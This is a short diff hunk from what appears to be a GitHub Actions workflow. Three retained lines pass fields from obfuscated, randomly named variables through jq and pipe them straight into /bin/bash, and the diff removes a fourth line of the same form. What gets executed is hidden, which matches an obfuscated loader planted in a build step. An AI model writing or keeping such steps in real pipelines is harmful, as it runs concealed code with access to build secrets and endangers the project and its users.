@@ -22,7 +22,6 @@ jobs:
           echo $ffiu158 | jq -r .l13 | /bin/bash
           printf '%s' "$taf84" | jq -r .ql30 | /bin/bash
           printf '%s' "$iq965" | jq -r .fdoi3002 | /bin/bash
-          echo $lhp85556 | jq -r .ngs38 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
